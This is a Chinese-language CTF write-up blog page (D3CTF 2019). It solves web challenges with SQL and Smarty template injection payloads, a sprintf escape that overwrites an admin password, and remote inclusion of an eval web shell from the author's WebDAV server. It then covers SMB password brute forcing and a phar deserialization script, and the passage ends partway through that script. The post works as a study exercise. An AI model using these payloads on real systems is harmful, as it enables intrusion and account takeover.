@@ -1,0 +1,535 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="description" content="D3CTF-wp"/>
+
+
+
+
+  <meta name="keywords" content="wp," />
+
+
+
+
+
+  <link rel="alternate" href="/default" title="glotozz'blog">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1" />
+
+
+
+<link rel="canonical" href="https://glotozz.github.io/2019/11/26/D3CTF-wp/"/>
+
+
+<meta property="og:type" content="article">
+<meta property="og:title" content="D3CTF-wp">
+<meta property="og:url" content="https://glotozz.github.io/2019/11/26/D3CTF-wp/index.html">
+<meta property="og:site_name" content="glotozz&#39;blog">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2019/11/26/kKqbvXgzCaMj2D6.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/26/qIxLCwfBK4b8tRJ.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/26/pvTWwzKPxAMXraD.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/26/RgavbGS1IrlcLY2.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/26/oSALxDdkE56BqhI.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/26/lUXhg58DAzZvqE7.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/26/4iXy9vYBLNCxzRS.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/26/vk7JDuUYeZr5QtO.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/26/Vaqm1RjSAtCU5IP.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/26/M7XhCpt1K3wOBxV.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/26/y97qzOjZBger2nT.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/26/HGcu6t2QxeE849q.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/26/uIWkiTpn4RDHYs1.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/26/1oGSUnZ65fmLchB.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/26/jOAfIrg1wGkTdDp.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/26/rw69ecdvmVfzKhq.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/26/IhSqxMZue3bE62K.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/26/zQuNSM6aDphtjGT.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/26/28KSVWq54begcR9.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/26/PkJlfyXTe194CzS.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/26/swkdhnaJBEHAI1Y.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/27/RzdyHS7uTvVl5k2.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/27/vSKFjUPlu7RcLWy.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/27/TNi5XDZfraV6Rmb.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/27/6kdWOJgIhsQ285x.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/27/YaWvmLp3OUBqtJ6.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/27/RguSfOekB6i4rQL.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/27/vdVAHwKnIbmN6pc.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/27/M3xAYDjqUwGeQgC.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/27/oEMqHGc9VDJNvrX.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/27/l3hdoCLcsYvGqrU.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/27/4e2nM9P8QAtsRjU.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/27/2xOCqmYKzutWy4d.png">
+<meta property="article:published_time" content="2019-11-26T00:01:11.000Z">
+<meta property="article:modified_time" content="2020-04-10T13:30:18.501Z">
+<meta property="article:author" content="glotozz">
+<meta property="article:tag" content="wp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2019/11/26/kKqbvXgzCaMj2D6.png">
+
+
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1" />
+<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>
+
+
+
+
+
+<script type="text/javascript">
+  var themeConfig = {
+    fancybox: {
+      enable: false
+    },
+  };
+</script>
+
+
+
+
+  
+
+
+<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="https://music.163.com/song/media/outer/url?id=28592088.mp3"></iframe>--!>
+<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="/57a2_fa12_13ff_c310c1889d0f14b24334ad7afef6b9b1.mp3"></iframe>--!>
+<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="https://music.163.com/outchain/player?type=2&id=574288806&auto=0&height=66"></iframe>--!>
+    <title> D3CTF-wp - glotozz'blog </title>
+  <meta name="generator" content="Hexo 4.2.0"></head>
+
+  <body>
+    <div id="page">
+      <header id="masthead"><div class="site-header-inner">
+    <h1 class="site-title">
+        <a href="/." class="logo">glotozz'blog</a>
+    </h1>
+
+    <nav id="nav-top">
+        
+            <ul id="menu-top" class="nav-top-items">
+                
+                    <li class="menu-item">
+                        <a href="/archives">
+                            
+                            
+                                Archives
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/about">
+                            
+                            
+                                About
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/read">
+                            
+                            
+                                Read
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/stars">
+                            
+                            
+                                Stars
+                            
+                        </a>
+                    </li>
+                
+            </ul>
+        
+  </nav>
+</div>
+
+      </header>
+      <div id="content">
+        
+    <div id="primary">
+        
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          D3CTF-wp
+        
+      </h1>
+
+      <time class="post-time">
+          Nov 26 2019
+      </time>
+    </header>
+
+
+
+    
+            <div class="post-content">
+            <meta name="referrer" content="no-referrer">
+<a id="more"></a>
+
+<p> &nbsp;  &nbsp; &nbsp;&nbsp;&nbsp;<strong>简陋的目录</strong></p>
+<!-- toc -->
+
+<ul>
+<li><a href="#easyweb">easyweb</a></li>
+<li><a href="#showhub">Showhub</a></li>
+<li><a href="#fakeonlinephp">fakeonlinephp</a></li>
+<li><a href="#ezupload">ezupload</a></li>
+<li><a href="#ezts">ezts</a></li>
+<li><a href="#参考链接">参考链接:</a></li>
+</ul>
+<!-- tocstop -->
+
+<hr>
+<p><strong>趁着D^3CTF环境还没关，赶紧复现一下</strong></p>
+<h3><span id="easyweb">easyweb</span></h3><p>这题给出了源码，代码审计</p>
+<p>漏洞触发点在<code>controllers/user.php</code></p>
+<p><img src="https://i.loli.net/2019/11/26/kKqbvXgzCaMj2D6.png" alt="Snipaste_2019-11-26_08-26-58.png"></p>
+<p>跟踪<code>get_view()</code></p>
+<p><img src="https://i.loli.net/2019/11/26/qIxLCwfBK4b8tRJ.png" alt="Snipaste_2019-11-26_08-28-15.png"></p>
+<p>跟踪<code>sql_safe()</code>和<code>safe_render()</code></p>
+<p><img src="https://i.loli.net/2019/11/26/pvTWwzKPxAMXraD.png" alt="Snipaste_2019-11-26_08-29-29.png"></p>
+<p>非常明显的利用点，那么我们只需要在<code>$username</code>注入的时候加上<code>{</code>绕过过滤即可</p>
+<p>简单测试一个</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aa&#39;un&#123;ion se&#123;lect 666 limit 1,1#</span><br></pre></td></tr></table></figure>
+
+<p>得到<code>666</code></p>
+<p>然后数据库中并没有flag，</p>
+<p>因为是<code>smarty</code>渲染模版，尝试模版注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;$smarty.version&#125;&#125;</span><br><span class="line">&#x3D;&gt;</span><br><span class="line">g&#39;un&#123;ion se&#123;lect 0x7B7B24736D617274792E76657273696F6E7D7D limit 1,1#</span><br></pre></td></tr></table></figure>
+
+<p>但是得使用函数。。。</p>
+<p><img src="https://i.loli.net/2019/11/26/RgavbGS1IrlcLY2.png" alt="Snipaste_2019-11-26_12-59-19.png"></p>
+<p><img src="https://i.loli.net/2019/11/26/oSALxDdkE56BqhI.png" alt="Snipaste_2019-11-26_13-32-21.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;php&#125;include(&#39;&#x2F;tmp&#x2F;6f9d434a1cb7d9a0cccc6469186e777b&#x2F;eval.jpg&#39;);&#123;&#x2F;php&#125;</span><br><span class="line">&#x3D;&gt;</span><br><span class="line">g&#39;un&#123;ion se&#123;lect </span><br><span class="line">0x7b7068707d696e636c75646528272f746d702f36663964343334613163623764396130636363633634363931383665373737622f6576616c2e6a706727293b7b2f7068707d limit 1,1#</span><br></pre></td></tr></table></figure>
+
+<p>发现不行，需要用两个大括号包裹，可能是被渲染一次后会少一个，具体等下次本地搭建一下<code>smarty</code>模板注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;php&#125;&#125;include(&#39;&#x2F;tmp&#x2F;6f9d434a1cb7d9a0cccc6469186e777b&#x2F;eval.jpg&#39;);&#123;&#123;&#x2F;php&#125;&#125;</span><br><span class="line">&#x3D;&gt;</span><br><span class="line">g&#39;un&#123;ion se&#123;lect 0x7b7b7068707d7d696e636c75646528272f746d702f36663964343334613163623764396130636363633634363931383665373737622f6576616c2e6a706727293b7b7b2f7068707d7d limit 1,1#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/11/26/lUXhg58DAzZvqE7.png" alt="TIM图片20191126133546.png"></p>
+<p><strong>有时间自己搭一下smarty环境复现</strong></p>
+<h3><span id="showhub">Showhub</span></h3><p>给了源码。。。很多时候看到源码就会紧张，但其实这里文件也不多</p>
+<p>问题出现在<code>Models/Model.php</code></p>
+<p><img src="https://i.loli.net/2019/11/26/4iXy9vYBLNCxzRS.png" alt="Snipaste_2019-11-26_13-40-26.png"></p>
+<p><code>sprintf()</code>格式化字符串漏洞之前也遇到过</p>
+<blockquote>
+<p>参考链接： <a href="https://blog.csdn.net/weixin_41185953/article/details/80485075" target="_blank" rel="noopener">https://blog.csdn.net/weixin_41185953/article/details/80485075</a> </p>
+<p>sprintf(format,arg1,arg2,arg++) </p>
+<p>arg1、arg2、++ 参数将被插入到主字符串中的百分号（%）符号处。该函数是逐步执行的。在第一个 % 符号处，插入 arg1，在第二个 % 符号处，插入 arg2，依此类推。</p>
+<p>注释：如果 % 符号多于 arg 参数，则您必须使用占位符。占位符位于 % 符号之后，由数字和 “$“ 组成。</p>
+</blockquote>
+<p>举个栗子</p>
+<p><img src="https://i.loli.net/2019/11/26/vk7JDuUYeZr5QtO.png" alt="Snipaste_2019-11-26_14-01-39.png"></p>
+<p>然后是看源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">switch (format[inpos]) &#123;</span><br><span class="line">case &#39;s&#39;:</span><br><span class="line">    &#123;</span><br><span class="line">        zend_string * t;</span><br><span class="line">        zend_string * str &#x3D; zval_get_tmp_string(tmp, &amp;t);</span><br><span class="line">        php_sprintf_appendstring( &amp; result, &amp;outpos, ZSTR_VAL(str), width, precision, padding, alignment, ZSTR_LEN(str), 0, expprec, 0);</span><br><span class="line">        zend_tmp_string_release(t);</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">case &#39;d&#39;:</span><br><span class="line">    php_sprintf_appendint( &amp; result, &amp;outpos, zval_get_long(tmp), width, padding, alignment, always_sign);</span><br><span class="line">    break;</span><br><span class="line">case &#39;u&#39;:</span><br><span class="line">    php_sprintf_appenduint( &amp; result, &amp;outpos, zval_get_long(tmp), width, padding, alignment);</span><br><span class="line">    break;</span><br><span class="line">case &#39;g&#39;:</span><br><span class="line">case &#39;G&#39;:</span><br><span class="line">case &#39;e&#39;:</span><br><span class="line">case &#39;E&#39;:</span><br><span class="line">case &#39;f&#39;:</span><br><span class="line">case &#39;F&#39;:</span><br><span class="line">    php_sprintf_appenddouble( &amp; result, &amp;outpos, zval_get_double(tmp), width, padding, alignment, precision, adjusting, format[inpos], always_sign);</span><br><span class="line">    break;</span><br><span class="line">case &#39;c&#39;:</span><br><span class="line">    php_sprintf_appendchar( &amp; result, &amp;outpos, (char) zval_get_long(tmp));</span><br><span class="line">    break;</span><br><span class="line">case &#39;o&#39;:</span><br><span class="line">    php_sprintf_append2n( &amp; result, &amp;outpos, zval_get_long(tmp), width, padding, alignment, 3, hexchars, expprec);</span><br><span class="line">    break;</span><br><span class="line">case &#39;x&#39;:</span><br><span class="line">    php_sprintf_append2n( &amp; result, &amp;outpos, zval_get_long(tmp), width, padding, alignment, 4, hexchars, expprec);</span><br><span class="line">    break;</span><br><span class="line">case &#39;X&#39;:</span><br><span class="line">    php_sprintf_append2n( &amp; result, &amp;outpos, zval_get_long(tmp), width, padding, alignment, 4, HEXCHARS, expprec);</span><br><span class="line">    break;</span><br><span class="line">case &#39;b&#39;:</span><br><span class="line">    php_sprintf_append2n( &amp; result, &amp;outpos, zval_get_long(tmp), width, padding, alignment, 1, hexchars, expprec);</span><br><span class="line">    break;</span><br><span class="line">case &#39;%&#39;:</span><br><span class="line">    php_sprintf_appendchar( &amp; result, &amp;outpos, &#39;%&#39;);</span><br><span class="line">    break;</span><br><span class="line">default:</span><br><span class="line">    break;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>可以看到， php源码中只对15种类型做了匹配， 其他字符类型都直接break了，php未做任何处理，直接跳过，所以导致了这个问题：</p>
+<p>没做字符类型检测的最大危害就是它可以吃掉一个转义符, 如果%后面出现一个,那么php会把\当作一个格式化字符的类型而吃掉, 最后%\（或%1$\）被替换为空</p>
+</blockquote>
+<p>那么回到题目上来，因为我们要逃逸单引号，那么势必%符号多余arg参数，考虑使用<code>%1$\</code>，从而逃逸这里<code>addslashes()</code>添加的<code>\</code></p>
+<p>构造</p>
+<p><img src="https://i.loli.net/2019/11/26/Vaqm1RjSAtCU5IP.png" alt="Snipaste_2019-11-26_14-47-26.png"></p>
+<p>那么这里admin密码是sha256加密的，即使爆破出来了也无济于事，提示修改密码</p>
+<blockquote>
+<p>利⽤<code>ON DUPLICATE KEY UPDATE</code> ,当insert已经存在的记录时，执⾏Update<br>用下面的当用户名, 密码随便, 注册</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">admin%1$&#39;,%1$&#39;password%1$&#39;) ON DUPLICATE KEY UPDATE password&#x3D;%1$&#39;9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08%1$&#39;#</span><br><span class="line">&#x3D;&gt;</span><br><span class="line">INSERT INTO &#96;$this-&gt;tbname&#96;(&#96;a&#96;,&#96;b&#96;) VALUE(&#39;admin&#39;,&#39;password&#39;) ON DUPLICATE KEY UPDATE password&#x3D;&#39;9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08&#39;#&#39;,&#39;sss&#39;)</span><br></pre></td></tr></table></figure>
+
+<p>本地简单测试一下，很成功</p>
+<p><img src="https://i.loli.net/2019/11/26/M7XhCpt1K3wOBxV.png" alt="Snipaste_2019-11-26_14-56-48.png"></p>
+<p>这里注册完直接就登录进去了。。。应该是根据注册时的用户名把</p>
+<p>不知道为啥退出再登录会失败。。。</p>
+<p>下一步是利用<code>HTTP请求走私攻击</code></p>
+<blockquote>
+<p>参考链接： <a href="https://mengsec.com/2019/10/10/http-request-smugging/" target="_blank" rel="noopener">https://mengsec.com/2019/10/10/http-request-smugging/</a> </p>
+</blockquote>
+<p><code>CL-TE</code></p>
+<p>可能由于我上一步不是直接登录的，导致也没成功</p>
+<p>===========================</p>
+<p>失败的原因可能是发的次数不够多，下次用bp的<code>intruder</code>发包</p>
+<blockquote>
+<p>这题的检测应该是在中间代理ATS服务器，通过检测才将请求转发给后端服务器。所以我们登陆admin后，直接访问<code>/WebConsole</code>是无法通过中间代理的检测的。但是因为检测是中间代理，后端服务器是无条件相信中间代理转发的包的，所以我们可以通过走私的方式将想要的数据包通过代理转发给后端服务器。 </p>
+</blockquote>
+<h3><span id="fakeonlinephp">fakeonlinephp</span></h3><p><img src="https://i.loli.net/2019/11/26/y97qzOjZBger2nT.png" alt="Snipaste_2019-11-26_16-12-55.png"></p>
+<p>开始以为是原题，发现环境经常会404。。。应该就是为了防止用原解</p>
+<blockquote>
+<p>参考翔哥的做法： <a href="https://nikoeurus.github.io/2019/11/25/2019NJUPTctf-wp/#fakeonlinephp" target="_blank" rel="noopener">https://nikoeurus.github.io/2019/11/25/2019NJUPTctf-wp/#fakeonlinephp</a> </p>
+</blockquote>
+<p>这里是<code>windows系统</code>，</p>
+<blockquote>
+<p>正常情况下无法远程包含，但是因为是windows，可以绕过<code>allow_url_include</code>的限制<code>RFI</code>，参考：  <a href="https://byqiyou.github.io/2019/05/15/bypass-RFI限制的一些思路/" target="_blank" rel="noopener">https://byqiyou.github.io/2019/05/15/bypass-RFI%E9%99%90%E5%88%B6%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%B7%AF/</a> </p>
+</blockquote>
+<p>首先启用<code>WebDAV</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -v ~&#x2F;webdav:&#x2F;var&#x2F;lib&#x2F;dav -e ANONYMOUS_METHODS&#x3D;GET,OPTIONS,PROPFIND -e LOCATION&#x3D;&#x2F;webdav -p 80:80 --rm --name webdav bytemark&#x2F;webdav</span><br></pre></td></tr></table></figure>
+
+<p> 启用后在<code>~/webdav/data</code>下放置<code>php文件</code></p>
+<p>包含</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?orange&#x3D;&#x2F;&#x2F;59.110.164.44&#x2F;&#x2F;webdav&#x2F;test.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/11/26/HGcu6t2QxeE849q.png" alt="Snipaste_2019-11-26_15-53-31.png"></p>
+<p>尝试写入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@&lt;?php</span><br><span class="line">	phpinfo();</span><br><span class="line">	@eval($_POST[&#39;cmd&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>发现没反应。。变形试试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@&lt;?php</span><br><span class="line">	phpinfo();</span><br><span class="line">    @eval(($_POST)&#123;cmd&#125;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>成功，用蚁剑连</p>
+<p>但是里面的文件内容是乱码。。。</p>
+<p><img src="https://i.loli.net/2019/11/26/uIWkiTpn4RDHYs1.png" alt="Snipaste_2019-11-26_16-41-08.png"></p>
+<p>修改下编码器成功</p>
+<p>这里再回去看看<code>phpinfo()</code>，正好前天学习看文章嫖了个工具😁</p>
+<blockquote>
+<p><a href="https://github.com/proudwind/phpinfo_scanner" target="_blank" rel="noopener">https://github.com/proudwind/phpinfo_scanner</a> </p>
+</blockquote>
+<p><img src="https://i.loli.net/2019/11/26/1oGSUnZ65fmLchB.png" alt="Snipaste_2019-11-26_16-25-17.png"></p>
+<p>利用蚁剑的插件扫描内网端口</p>
+<p><img src="https://i.loli.net/2019/11/26/jOAfIrg1wGkTdDp.png" alt="Snipaste_2019-11-26_16-27-30.png"></p>
+<p><code>.git</code>泄露</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python git_extract.py http:&#x2F;&#x2F;3f2b604603.fakeonelinephp.d3ctf.io&#x2F;.git&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p><code>hint2.txt</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">10.24 🌧️</span><br><span class="line">这台💻跑着web服务，为了防止大黑阔用nginx 0day黑我电脑拿flag，👴把flag放到了内网的💻上(172.19.97.8 C:\Users\Administrator\Desktop\flag.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/11/26/rw69ecdvmVfzKhq.png" alt="Snipaste_2019-11-26_17-06-29.png"></p>
+<p>还给了个字典</p>
+<blockquote>
+<p>显然需要我们爆破密码进入内网</p>
+<p>而之前就通过扫描发现这台内网主机<strong>172.19.97.8</strong>是开放445端口SMB服务的，而且给了字典，所以我们直接上传<strong>hydra</strong>工具后进行爆破密码即可：</p>
+</blockquote>
+<p>上传<code>hydra</code>，一开始不行，换了个目录成功了</p>
+<p>但是虚拟终端仍然执行不了命令。。。。翔哥说用linux的可以👍</p>
+<p>那么kali中安装antsowrd，一开始参考网上的花了一些时间利用nodejs发现还是不行，还是参考官方github的靠谱</p>
+<blockquote>
+<p><a href="https://doc.u0u.us/zh-hans/getting_started/get_antsword.html" target="_blank" rel="noopener">https://doc.u0u.us/zh-hans/getting_started/get_antsword.html</a> </p>
+</blockquote>
+<p>先下载加载器，再加载源码即可</p>
+<p><img src="https://i.loli.net/2019/11/26/IhSqxMZue3bE62K.png" alt="Snipaste_2019-11-26_18-24-03.png"></p>
+<p>前人栽树，发现12文件夹已经上传好了<code>hydra</code>，当时自己上传也行，就是有点不稳定</p>
+<p><img src="https://i.loli.net/2019/11/26/zQuNSM6aDphtjGT.png" alt="Snipaste_2019-11-26_18-34-18.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\172.19.97.8\ipc$ eDHU27TlY6ugslV &#x2F;user:administrator</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\172.19.97.8\c$</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type \\172.19.97.8\c$\Users\Administrator\Desktop\flag.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/11/26/28KSVWq54begcR9.png" alt="Snipaste_2019-11-26_18-37-44.png"></p>
+<p><strong>这方面真的是盲区。。。复现成功还是挺有感觉的</strong></p>
+<h3><span id="ezupload">ezupload</span></h3><p><img src="https://i.loli.net/2019/11/26/PkJlfyXTe194CzS.png" alt="Snipaste_2019-11-26_19-28-25.png"></p>
+<p>先看看过滤方法</p>
+<p><img src="https://i.loli.net/2019/11/26/swkdhnaJBEHAI1Y.png" alt="Snipaste_2019-11-26_19-30-57.png"></p>
+<p><code>ph后缀</code>被ban了，想到<code>.htaccess</code></p>
+<p><img src="https://i.loli.net/2019/11/27/RzdyHS7uTvVl5k2.png" alt="Snipaste_2019-11-27_08-05-37.png"></p>
+<p>但是对内容存在限制，下面两种无法使用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .jpg</span><br><span class="line">php_value auto_prepend_file &quot;&#x2F;home&#x2F;fdipzone&#x2F;header.php&quot;</span><br></pre></td></tr></table></figure>
+
+<p>这里可以使用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler php7-script .txt</span><br></pre></td></tr></table></figure>
+
+<p><code>file://</code>和<code>php://</code>被ban了，利用<code>data://</code>或者<code>http://</code>协议</p>
+<p>先尝试写入<code>.htaccess</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action&#x3D;upload&amp;url&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,QWRkSGFuZGxlciBwaHA3LXNjcmlwdCAudHh0&amp;filename&#x3D;.htaccess</span><br></pre></td></tr></table></figure>
+
+<p>调试是成功的，但是<code>windows</code>由于无法写入<code>.</code>开头的文件，切换到<code>linux下</code></p>
+<p><strong>中间出现了点小报错查看<code>error_log</code>即可</strong></p>
+<p><img src="https://i.loli.net/2019/11/27/vSKFjUPlu7RcLWy.png" alt="Snipaste_2019-11-27_08-54-49.png"></p>
+<p>再开启下扩展</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LoadModule rewrite_module modules&#x2F;mod_rewrite.so</span><br><span class="line">AllowOverride All</span><br></pre></td></tr></table></figure>
+
+<p>突然发现事情并不简单😱。。。为啥之前<code>__destruct()</code>写入的文件不存在。。<code>error_log</code>看一下提示没有权限。。。但是同样的权限<code>.htaccess</code>成功创建</p>
+<p>这其实算是一个提示把，本地测一下<code>__destruct()</code>的当前路径</p>
+<p><img src="https://i.loli.net/2019/11/27/TNi5XDZfraV6Rmb.png" alt="Snipaste_2019-11-27_09-54-36.png"></p>
+<p><img src="https://i.loli.net/2019/11/27/6kdWOJgIhsQ285x.png" alt="Snipaste_2019-11-27_09-53-57.png"></p>
+<p>发现在根目录，那么这里要写入的话可以通过触发反序列化来写入，正好之前的<code>phar://</code>没有被<code>ban</code></p>
+<p>并且<code>phar</code>是可以<code>gzip</code>压缩的，从而绕过对某些字符的检查</p>
+<p>那么还需要解决<code>__destruct()</code>中写入文件的绝对路径的问题，列目录</p>
+<p>利用<code>__toString()</code></p>
+<p><img src="https://i.loli.net/2019/11/27/YaWvmLp3OUBqtJ6.png" alt="Snipaste_2019-11-27_10-36-03.png"></p>
+<p>举个例子</p>
+<p><img src="https://i.loli.net/2019/11/27/RguSfOekB6i4rQL.png" alt="Snipaste_2019-11-27_10-37-02.png"></p>
+<p>那么我们先获取绝对路径</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	class dir&#123;</span><br><span class="line">		public $userdir;</span><br><span class="line">		public $filename;</span><br><span class="line">		public $url;</span><br><span class="line">		public function __construct($url,$filename) &#123;</span><br><span class="line">			$this-&gt;url &#x3D; $url;</span><br><span class="line">       		$this-&gt;filename  &#x3D;  $filename;</span><br><span class="line">		&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $a &#x3D; new dir(&#39;a&#39;,&#39;a&#39;);</span><br><span class="line">    $a -&gt; userdir &#x3D; &#39;..&#x2F;&#39;;</span><br><span class="line">    $b &#x3D; new dir(&#39;b&#39;,&#39;b&#39;);</span><br><span class="line">    $b -&gt; userdir &#x3D; $a;</span><br><span class="line">    @unlink(&quot;phar.phar&quot;);</span><br><span class="line">    $phar &#x3D; new Phar(&quot;phar.phar&quot;); &#x2F;&#x2F;后缀名必须为phar</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); &#x2F;&#x2F;设置stub</span><br><span class="line">    $phar-&gt;setMetadata($b); 